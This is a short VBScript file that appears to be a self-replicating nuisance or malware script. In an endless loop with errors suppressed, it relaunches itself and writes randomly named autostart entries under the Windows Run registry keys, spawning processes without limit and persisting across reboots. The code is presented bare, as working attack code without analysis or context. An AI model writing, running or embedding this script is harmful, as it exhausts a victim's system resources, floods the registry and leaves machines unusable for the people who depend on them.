   Set WSHShell=CreateObject("WScript.Shell")
   On Error Resume Next
   Randomize Timer
   Do
   WSHShell.Run WScript.ScriptFullName
   WSHShell.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\"+Cstr(Int(rnd*1000000)),WScript.ScriptFullName
   WSHShell.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunService\"+Cstr(Int(rnd*1000000)),WScript.ScriptFullName
   Loop
